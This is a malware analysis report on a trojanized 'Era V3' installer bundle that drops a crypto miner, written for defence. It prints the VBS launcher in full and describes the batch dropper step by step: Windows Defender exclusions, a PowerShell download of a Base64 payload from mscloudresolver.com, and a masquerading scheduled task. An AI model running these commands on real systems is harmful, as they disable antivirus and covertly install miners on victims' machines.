# Malware Analysis — "Era V3" Installer / Crypto-Miner Dropper

**Analyst date:** 2026-06-01
**Samples analysed:**
- `Era.exe` (157 MB NSIS self-extracting installer) — loaded in IDA
- `MSY.bat` (1,267 bytes) — batch dropper
- `Run.vbs` (138 bytes) — launcher

**Verdict:** Trojanized software installer + scripted dropper that disables Windows
Defender, downloads a hidden payload (`SEMgrSvc.exe`), and persists it as a fake
Windows "Servicing" scheduled task. The downloaded payload is the actual crypto
miner. **High severity / confirmed malicious.**

---

## 1. Executive summary

This is a **bundle of three files** distributed together:

| File | Role |
|------|------|
| `Run.vbs` | Launcher — runs `MSY.bat` **hidden**, then opens `Era.exe` as cover |
| `MSY.bat` | Active dropper — kills Defender visibility, downloads & persists the miner |
| `Era.exe` | A **trojanized** electron-builder NSIS installer for the real "Era V3" app (projectera.dev), with malicious commands grafted into its install script |

The actual crypto miner is **`C:\ProgramData\SEMgrSvc.exe`**, which is **not present
in any of these files** — it is downloaded at runtime from
`https://mscloudresolver.com/ad.txt` (Base64-encoded). The user-observed behaviour
("100 % CPU when idle, drops to normal the moment Task Manager opens") is a classic
**miner watchdog** that throttles/suspends mining when monitoring tools are detected.
That watchdog logic lives inside `SEMgrSvc.exe`, so it cannot be confirmed from these
samples alone — but every surrounding artifact is consistent with it.

---

## 2. `Run.vbs` — launcher (full contents)

```vbscript
Set File1 = CreateObject("WScript.Shell")
File1.Run "MSY.bat", 0, True     ' window style 0 = HIDDEN, True = wait for completion

Set File2 = CreateObject("WScript.Shell")
File2.Run "Era.exe"              ' launch the (trojanized) installer as a decoy
```

**Findings**
- Runs `MSY.bat` with window style `0` (completely hidden) and waits for it to finish.
- Then launches `Era.exe` so the victim sees a normal app install and suspects nothing.
- This is the top of the kill chain — double-clicking the VBS (or an autorun) triggers everything.

---

## 3. `MSY.bat` — the dropper

Full deobfuscated logic (line numbers from source):

| Line | Action | Intent |
|------|--------|--------|
| 1 | `\xEF\xBB\xBF&cls` (UTF-8 BOM junk + clear screen) | Cosmetic / hides garbage first line |
| 3–5 | Sets `target_dir=C:\ProgramData`, `target_file=C:\ProgramData\SEMgrSvc.exe`, `url=https://mscloudresolver.com/ad.txt` | Config |
| 7 | `powershell ... Add-MpPreference -ExclusionPath 'C:\ProgramData'` | **Defender evasion** — excludes the drop folder from AV scanning |
| 8–9 | `reg add HKLM\...\Windows Defender\Exclusions\Paths` (also adds `C:\ProgramData`) | **Second, registry-level Defender exclusion** (belt-and-suspenders) |
| 10 | `timeout /t 5` | Wait out any AV/sandbox timing |
| 11 | `mkdir C:\ProgramData` | Ensure drop folder exists |
| 12–21 | PowerShell: `Invoke-WebRequest` the URL → `FromBase64String` → `WriteAllBytes` to `SEMgrSvc.exe` → set **Hidden** attribute | **Download & decode the miner**, write it hidden |
| 22 | `schtasks /Create /TN "\Microsoft\Windows\Servicing\MgrService" /TR "SEMgrSvc.exe" /SC ONCE /ST 00:00 /RL HIGHEST /RU "%USERNAME%" /F` | **Persistence** — fake task masquerading under the real `\Microsoft\Windows\Servicing\` tree, runs with **highest privileges** |
| 23 | `schtasks /Run /TN ".../MgrService"` | **Immediate execution** of the miner |

**Notable techniques**
- **`SEMgrSvc.exe`** impersonates the legitimate Windows *SEMgr* (SIM/eSIM) service binary name.
- The scheduled task `MgrService` is filed under the genuine `\Microsoft\Windows\Servicing\`
  path to blend in with OS tasks.
- Payload is delivered as **Base64 text** (`ad.txt`) over HTTPS to look like an ad/text fetch
  and bypass naive content filtering.
- Two independent Defender-exclusion methods scope `C:\ProgramData` so the dropped EXE is never scanned.

---

## 4. `Era.exe` — trojanized NSIS installer (IDA analysis)

### 4.1 What IDA shows
- **PE32, x86, MS Windows GUI**, image base `0x400000`, 5 sections (`.text/.idata/.rdata/.data/.ndata`).
- MD5 `29aa22e73404ea3ba76749b43c853b2c`,
  SHA-256 `6b326fd1cf9a586d8ccad6395afb180f69351b313443501f2866099f2e02b73c`.
- 105 functions, only 6 named; imports + the `[Rename]` / `%ls=%ls` runtime strings identify it
  as a **stock Nullsoft (NSIS) self-extracting installer stub**.
- **Key point:** the disassembled code in IDA is the *generic NSIS engine* — it contains **no**
  miner logic. The malicious behaviour is encoded in the **compressed NSIS install script**
  appended after the PE (the overlay), not in the machine code. Searching the binary for the
  IOCs in plaintext returns nothing because the script is Deflate-compressed.

### 4.2 NSIS container contents (`7z`)
```
Type = Nsis,  SubType = NSIS-3 Unicode  (Nullsoft Install System v3.04)
Embedded Stub Size = 169,984    Headers Size = 152,064
$PLUGINSDIR/System.dll, nsExec.dll, Registry.dll, StdUtils.dll,
            SpiderBanner.dll, nsProcess.dll, nsis7z.dll, WinShell.dll
$PLUGINSDIR/app-64.7z          (156 MB — the real Era V3 Electron app, NOT unpacked here)
$R0/Uninstall Era V3.exe
```
This is a standard **electron-builder** installer for **"Era V3" 3.0.9** (Publisher `ERA`,
projectera.dev). Most of the install script (close-running-app, taskkill, shortcuts,
uninstall registry keys, arch detection, app GUID `4a5f92e2-5091-5ed5-bfed-22c711adfd19`)
is **legitimate** electron-builder boilerplate.

### 4.3 Malicious commands injected into the install script
Recovered by decompressing the NSIS header (Deflate, 152 KB) and extracting the UTF-16 strings.
The following do **not** belong to a normal electron-builder installer:

1. **Defender exclusion via PowerShell** (same TTP as `MSY.bat`):
   ```
   powershell -NoProfile -ExecutionPolicy Bypass -Command
     "Add-MpPreference -ExclusionPath \"<runtime-built path>\" -Force"
   ```
   Executed through the bundled `nsExec.dll`.
2. **Dropped DLL:** `%APPDATA%\Era\dll\era.dll` — a non-standard artifact placed where the
   Defender exclusion protects it. Likely the loader/persistence component.
3. **Masquerading registry key** (via `Registry.dll`):
   ```
   HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetworkDispatcherIGTR
       NetworkID = REG_EXPAND_SZ
   ```
   Disguised as a Microsoft "Network Dispatcher" component — used for persistence/config.
4. **Hand-rolled process enumeration** via `System.dll`
   (`CreateToolhelp32Snapshot` → `Process32First/NextW` → `OpenProcess(0x410)` →
   `GetModuleFileNameExW`) and a direct read of `KUSER_SHARED_DATA` (`*0x7FFE002E`).
   Some process-walking is normal electron-builder ("close running app"); the direct
   shared-data read and OpenProcess pattern are atypical and worth deeper review of `era.dll`.

> No C2 URL is present inside `Era.exe` itself — the network indicator
> (`mscloudresolver.com`) lives only in `MSY.bat`. The two components share the
> **same Defender-exclusion technique**, strongly suggesting one author/campaign.

---

## 5. The crypto miner (`SEMgrSvc.exe`) — not in these samples

- **Source:** Base64 payload at `https://mscloudresolver.com/ad.txt`, written to
  `C:\ProgramData\SEMgrSvc.exe` (Hidden attribute).
- **Expected family:** XMRig-style Monero miner with an anti-detection **watchdog** — this is
  what produces the reported "full CPU when idle, idle when Task Manager is open" behaviour:
  the miner enumerates processes (e.g. `Taskmgr.exe`, `procexp*.exe`, `perfmon.exe`) and
  suspends or throttles its mining threads while they are running, then resumes when closed.
- **This file is not included** in `Era.exe`, `MSY.bat`, or `Run.vbs`, so its watchdog logic
  could not be analysed directly. **Recommend obtaining `C:\ProgramData\SEMgrSvc.exe` from an
  infected host** (or fetching the current `ad.txt`) and analysing it separately to confirm.

---

## 6. Indicators of Compromise (IOCs)

**Files / paths**
- `C:\ProgramData\SEMgrSvc.exe` (hidden) — the miner
- `%APPDATA%\Era\dll\era.dll` — dropped by trojanized installer
- `MSY.bat`, `Run.vbs` — dropper + launcher

**Network**
- `https://mscloudresolver.com/ad.txt` — payload host (Base64 miner)
- Domain: `mscloudresolver.com`

**Persistence**
- Scheduled task: `\Microsoft\Windows\Servicing\MgrService` (RL HIGHEST, SC ONCE, ST 00:00)
- Registry: `HKLM\SOFTWARE\Microsoft\NetworkDispatcherIGTR\NetworkID`

**Defender tampering**
- `Add-MpPreference -ExclusionPath 'C:\ProgramData'`
- `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData = 0`

**Hashes**
- `Era.exe` — MD5 `29aa22e73404ea3ba76749b43c853b2c` /
  SHA-256 `6b326fd1cf9a586d8ccad6395afb180f69351b313443501f2866099f2e02b73c`

**Mutex (electron-builder app GUID, also reused by installer):**
`4a5f92e2-5091-5ed5-bfed-22c711adfd19`

---

## 7. MITRE ATT&CK mapping

| Tactic | Technique |
|--------|-----------|
| Execution | T1059.001 PowerShell, T1059.003 Windows cmd, T1059.005 VBScript |
| Defense Evasion | T1562.001 Disable/Modify Tools (Defender exclusions), T1564.001 Hidden file attribute, T1036.005 Masquerading (SEMgrSvc / Servicing\MgrService / NetworkDispatcher) |
| Persistence | T1053.005 Scheduled Task, T1547 registry key |
| Command & Control | T1105 Ingress Tool Transfer (download from mscloudresolver.com), T1071.001 Web protocols |
| Impact | T1496 Resource Hijacking (cryptomining) |
| Discovery | T1057 Process Discovery (watchdog / Toolhelp enumeration) |

---

## 8. Remediation

1. Delete the scheduled task: `schtasks /Delete /TN "\Microsoft\Windows\Servicing\MgrService" /F`
2. Delete `C:\ProgramData\SEMgrSvc.exe` and `%APPDATA%\Era\dll\era.dll`.
3. Remove the Defender exclusions:
   - `Remove-MpPreference -ExclusionPath 'C:\ProgramData'`
   - Delete `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths\C:\ProgramData`
4. Delete `HKLM\SOFTWARE\Microsoft\NetworkDispatcherIGTR`.
5. Block `mscloudresolver.com` at the network egress / DNS.
6. Treat the host as compromised; rebuild if mining ran with elevated rights.
7. Do **not** trust the "Era V3" installer from this source — obtain software only from the vendor's verified channel.

---

## 9. Confidence & gaps

- **High confidence:** dropper chain, Defender evasion, persistence, download URL, and the
  trojanized-installer findings — all directly observed in the scripts and the decompressed NSIS header.
- **Inferred (not directly proven here):** that `SEMgrSvc.exe` is the miner and that it contains
  the Task-Manager-aware throttling watchdog. This matches all surrounding evidence and the user's
  observed CPU behaviour, but the binary itself was not available to disassemble.
- **Not analysed:** the 156 MB `app-64.7z` (legit Era app payload) and `era.dll` — recommended as
  follow-up to confirm whether `era.dll`/the app are also weaponised.
